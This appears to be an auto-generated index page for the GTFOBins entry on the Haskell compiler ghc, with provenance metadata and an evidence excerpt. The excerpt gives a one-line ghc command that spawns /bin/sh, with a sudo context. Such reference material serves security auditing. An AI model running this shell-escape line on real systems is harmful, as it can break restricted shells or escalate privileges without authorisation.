---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# ghc

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `ghc` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ghc` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for ghc covering shell.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/ghc.md)
- Source verification: [source record](../../sources/gtfobins/ghc.md)

## Aliases

- `ghc`

## Source Verification

[source record](../../sources/gtfobins/ghc.md)

## Evidence Excerpt

```text
_body: ''
_name: ghc
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ghc
functions:
shell:
- code: ghc -e 'System.Process.callCommand "/bin/sh"'
contexts:
sudo: null
```
